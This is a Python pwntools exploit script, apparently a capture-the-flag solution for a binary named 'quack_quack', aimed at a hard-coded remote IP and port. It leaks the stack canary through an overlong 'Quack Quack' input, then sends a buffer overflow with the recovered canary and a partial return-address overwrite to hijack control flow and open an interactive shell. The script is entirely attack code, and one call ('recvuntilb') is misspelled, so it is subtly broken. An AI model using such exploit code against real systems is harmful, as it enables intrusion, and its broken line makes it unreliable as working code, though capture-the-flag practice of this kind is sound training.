from pwn import *
import sys
import os

BINARY = "./quack_quack"
LIBC = "./glibc/libc.so.6"

context.binary = BINARY
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

gdbscript = """
b duckling
continue
"""

elf = ELF(BINARY)
libc = ELF(LIBC) if os.path.exists(LIBC) else None

def start(argv=[]):
    if args.GDB:
        return gdb.debug([BINARY], gdbscript=gdbscript)
    else:
        return remote("94.237.61.48", 43062)

def main():
    p = start()
    p.recvuntil(b"> ")

    payload = b"A"*89 + b"Quack Quack " + b"A" 
    p.send(payload)
    p.recvuntilb("Quack Quack ")

    canary = u64(p.recv(7).rjust(8, b"\x00"))
    print("canary: ", hex(canary))
    p.recvuntil(b"> ")
    payload = b"A"*88 + p64(canary) + b"B"*8 + b"\x7f\x13"
    p.send(payload)


    p.interactive()

if __name__ == "__main__":
    main()
